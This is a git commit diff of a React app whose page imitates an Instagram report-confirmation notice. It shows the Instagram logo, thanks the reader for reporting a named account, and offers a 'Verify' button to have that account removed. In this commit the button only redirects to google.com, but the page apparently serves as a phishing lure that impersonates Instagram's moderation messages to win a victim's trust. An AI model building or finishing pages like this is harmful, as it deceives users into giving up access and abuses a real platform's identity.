a917b72d298db0a2be9f5f9471d02f8aea4aaeee
Rishiraj <52316252+Rishiraj122@users.noreply.github.com>
2022-03-23 11:48:35 +0530

    First Commit

--- src/App.js
+++ src/App.js
@@ -1,23 +1,22 @@
-import logo from './logo.svg';
+import logo from './InstagramLogo.webp';
 import './App.css';
 
 function App() {
+  async function buttonClicked(){
+    window.location.href='https://www.google.com';
+  }
   return (
     <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+      <center><img src={logo} className="App-logo" alt="logo" /></center>
+      <h1>Thank you for your reporting</h1>
+      <h4>Thank you for taking the time to report savijoshnarani's account. While 
+        we reviewed the account you reported for harassment or bullying and found 
+        it does violate our Community Guidlines, reports like yours 
+        are an important part of making Instagram a safe and welcoming place for 
+        everyone.
+      </h4>
+      <center><h5>Verify if you want savijoshnarani's account to get removed from Instagram</h5></center>
+      <center><button onClick={buttonClicked}>Verify</button></center>
     </div>
   );
 }
